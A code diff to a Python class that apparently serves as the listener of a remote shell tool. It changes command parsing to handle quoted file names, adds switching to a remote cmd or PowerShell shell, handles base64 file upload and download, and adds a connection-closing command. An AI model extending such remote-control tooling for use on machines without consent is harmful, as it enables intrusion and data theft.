@@ -10,6 +10,8 @@ import base64
 import curses
 import time
 import threading
+import shlex
+import re
 
 class Listr:
 
@@ -61,7 +63,7 @@ class Listr:
     def w_f(self, path, item):
         with open(path, "wb") as f:
             f.write(base64.b64decode(item))
-            return "Downloaded\n"
+            return f'Downloaded at {path}\n'
     
 
     def r_f(self, path):
@@ -286,22 +288,44 @@ class Listr:
         wait_dwnl_eve = threading.Event()
         wait_dwnl = threading.Thread(target=self.wait_dwnl__, args=(wait_dwnl_eve,))
         try:
-            self.comm = comm.split(" ")
-            # Here, the file is appended to the file.
-            if self.comm[0] == "upload":
+            # Files with whitespaces are managed within ("")
+            # Checks if it's got ".*"
+            check_comm = re.search(r'(\".+?\")', comm)
+            if check_comm:
+                # Split every string without or within ""
+                check_comm = shlex.split(str(comm), posix=False)
+                for i in range(len(check_comm)):
+                    # Get rid of " so that the quotaton is not going to be part of the string
+                    check_comm[i] = check_comm[i].replace('\"', '')
+                self.comm = check_comm
+            else:
+                self.comm = comm.split(" ")
+
+            # Setting the cli. 
+            if len(self.comm) == 1 and (self.comm[0] == "cmd" or self.comm[0] == "powershell"):
+                self.comm[:0] = ['setcli']
+
+            # Uploading, the file is appended to comm.
+            elif self.comm[0] == "upload":
                 self.comm.append(self.r_f(self.comm[1]))
-            if self.comm[0] == "download":
+            elif self.comm[0] == "download":
                 wait_dwnl.start()
             result = self.exe_rmy(self.comm)
-            wait_dwnl_eve.set()
-            time.sleep(0.5)
-            # while is to make sure if there is still connection
+            if "exitc" == comm:
+                self.conn.close()
+                exit()
+                # self.send_data("check...")
+            # while is to make sure if there is still connection after exitc command
             while result == None:
                 result = self.exe_rmy(self.comm)
+            
+            # Download's ani-waiting
+            if self.comm[0] == "download":
+                wait_dwnl_eve.set()
+                time.sleep(0.5)
+            
             if self.comm[0] == "download" and "[Bad command]" not in result:
                 result = self.w_f(self.comm[1], result.encode())
-            if "exit" in comm:
-                self.send_data("test...")
             return result
         except FileNotFoundError as notfound:
             # print(f"\n\r{notfound.strerror}\n")
